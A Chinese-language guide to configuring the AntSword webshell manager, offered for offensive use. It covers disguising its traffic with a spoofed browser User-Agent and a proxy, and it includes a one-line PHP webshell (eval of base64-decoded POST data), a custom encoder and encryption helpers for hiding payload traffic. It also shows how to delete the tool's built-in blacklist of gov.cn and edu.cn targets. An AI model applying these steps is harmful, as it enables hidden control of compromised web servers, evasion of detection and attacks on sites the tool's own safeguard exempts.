# AntSword

---

**中国蚁剑**

PS：使用加载器加载源码即可

```
源  码 ：https://github.com/AntSwordProject/antSword
加载器 ： https://github.com/AntSwordProject/AntSword-Loader
```

**注意事项**

```
AntSword/系统设置/代理设置/（设置代理）
AntSword/系统设置/默认设置/数据管理/忽略HTTPS证书（勾选）
AntSword/系统设置/默认设置/数据管理/小窗口右键添加请求头：（也可以通过下面修改header特征）
	name：user-agent
	value：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
```

**修改header特征**

```
编辑数据/请求信息/(暂时修改为chrome的header)
	User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
---
也可以通过修改配置进行永久修改
/modules/request.js
const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 '
```

**流量加密**

AntSword/编码设置/新建编码器or解码器 进行流量包的加密

webshell：eval(base64_decode($_POST['test']));  

修改默认编码器：

x.toString('') #支持hex（十六进制）、base64、binary（二进制）

```
/**
 * php::base64编码器
 * Create at: 2020/05/19 16:57:59
 */

'use strict';
/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  // ##########    请在下方编写你自己的代码   ###################
  // 以下代码为 PHP Base64 样例
  data[pwd] = Buffer.from(data['_']).toString('base64');   //只要修改这个即可
  // ##########    请在上方编写你自己的代码   ###################
  // 删除 _ 原有的payload
  delete data['_'];
  // 返回编码器处理后的 payload 数组
  return data;
}
```

加密函数demo：（只列举可用的函数）

````
node.js:
function xor(payload){
	ext.opts.httpConf.headers['Cookie'] = 'PHPSESSID=' + key; //设置cookie
	key = key.split("").map(t => t.charCodeAt(0)); //key成数组并转成unicode编码
	cipher =cipher.map(t => String.fromCharCode(t)).join("") //unicode转成正常字符串
	btoa(字符串) //binary to ascii 也即是base64编码过程，解密atob()、
	Base64.encode(字符串)      //Base64.decode(字符串)
}
````

解密函数demo：（只列举可用的函数）

```
php:
function orz(payload){
	strlen()
	base_convert(字符串,2,16)
	pack(字符串,)
	openssl_decrypt()
	json_decode()
}
```

删除黑名单 - 提示Blacklist URL

```
/modules/config.js
urlblacklist(){
	return /(gov.cn|edu.cn)/  # ->a.cn|b.cn
}
```





**可加载插件**